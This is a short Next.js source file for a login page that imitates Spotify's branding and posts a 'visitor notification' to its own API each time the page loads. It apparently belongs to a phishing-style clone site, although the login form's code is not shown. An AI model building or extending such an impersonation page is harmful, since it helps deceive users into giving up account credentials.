"use client"

import { useEffect } from "react"
import { SpotifyLoginForm } from "@/components/spotify-login-form"
import { SpotifyFooter } from "@/components/spotify-footer"

export default function LoginPage() {
  useEffect(() => {
    const sendVisitorNotification = async () => {
      try {
        await fetch("/api/visitor-notification", {
          method: "POST",
        })
      } catch (error) {
        console.error("[v0] Failed to send visitor notification:", error)
      }
    }

    sendVisitorNotification()
  }, [])

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col">
      <main className="flex-1 flex items-center justify-center p-4 py-8 sm:py-12">
        <SpotifyLoginForm />
      </main>
      <SpotifyFooter />
    </div>
  )
}
